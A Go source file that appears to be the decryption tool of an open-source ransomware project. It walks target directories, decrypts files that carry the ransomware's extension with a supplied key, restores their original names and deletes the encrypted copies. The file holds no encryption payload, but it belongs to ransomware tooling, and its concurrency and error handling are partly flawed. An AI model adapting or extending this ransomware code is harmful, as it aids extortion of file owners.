package main

import (
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"path/filepath"
	"strings"
	"sync"

	"github.com/mauri870/cryptofile/crypto"
	"github.com/mauri870/ransomware/cmd"
)

func main() {
	// Fun ASCII
	cmd.PrintBanner()

	// Execution locked for windows
	cmd.CheckOS()

	args := os.Args

	if len(args) < 2 {
		cmd.Usage("")
	}

	switch args[1] {
	case "-h", "help", "h":
		cmd.Usage("")
	case "decrypt":
		if len(args) != 3 {
			cmd.Usage("Missing decryption key")
		}

		decryptFiles(args[2])
		break
	default:
		cmd.Usage("")
	}
}

func decryptFiles(key string) {
	// The encription key is randomly and generated on runtime, so we cannot known
	// if an encryption key is correct
	fmt.Println("Note: \nIf you are trying a wrong key your files will be decrypted with broken content irretrievably, please don't try keys randomly\nYou have been warned")
	fmt.Println("Continue? Y/N")

	var input rune
	fmt.Scanf("%c", &input)

	if input != 'Y' {
		os.Exit(2)
	}

	log.Println("Walking dirs and searching for encrypted files...")

	// Setup a waitgroup so we can wait for all goroutines to finish
	var wg sync.WaitGroup

	wg.Add(1)

	// Indexing files in concurrently thread
	go func() {
		// Decrease the wg count after finish this goroutine
		defer wg.Done()

		// Loop over the interesting directories
		for _, f := range cmd.InterestingDirs {
			folder := cmd.BaseDir + f
			filepath.Walk(folder, func(path string, f os.FileInfo, err error) error {
				ext := filepath.Ext(path)
				if ext == cmd.EncryptionExtension {
					// Matching Files encrypted
					file := cmd.File{FileInfo: f, Extension: ext[1:], Path: path}

					// Each file is processed by a free worker on the pool, so, for each file
					// we need wait for the respective goroutine to finish
					wg.Add(1)

					// Send the file to the MatchedFiles channel then workers
					// can imediatelly proccess then
					cmd.MatchedFiles <- file
					log.Println("Matched:", path)
				}
				return nil
			})
		}

		// Close the MatchedFiles channel after all files have been indexed and send to then
		close(cmd.MatchedFiles)
	}()

	// Process files that are sended to the channel
	// Launch NumWorker workers for handle the files concurrently
	for i := 0; i < cmd.NumWorkers; i++ {
		go func() {
			for {
				select {
				case file, ok := <-cmd.MatchedFiles:
					// Check if has nothing to receive from the channel
					if !ok {
						return
					}
					defer wg.Done()

					log.Printf("Decrypting %s...\n", file.Path)
					// Read the file content
					ciphertext, err := ioutil.ReadFile(file.Path)
					if err != nil {
						log.Printf("Error opening %s\n", file.Path)
						return
					}

					// Decrypting with the key
					text, err := crypto.Decrypt([]byte(key), ciphertext)
					if err != nil {
						log.Println(err)
						return
					}

					// Write a new file with the decrypted content and original name
					encodedFileName := file.Name()[:len(file.Name())-len("."+file.Extension)]
					filepathWithoutExt := file.Path[:len(file.Path)-len(filepath.Ext(file.Path))]
					decodedFileName, err := base64.StdEncoding.DecodeString(encodedFileName)
					if err != nil {
						log.Println(err)
						return
					}

					newpath := strings.Replace(filepathWithoutExt, encodedFileName, string(decodedFileName), -1)
					err = ioutil.WriteFile(newpath, text, 0600)
					if err != nil {
						log.Println(err)
						return
					}

					// Remove the encrypted file
					os.Remove(file.Path)
					if err != nil {
						log.Println(err)
					}
				}
			}
		}()
	}

	// Wait for all goroutines to finish
	wg.Wait()
}
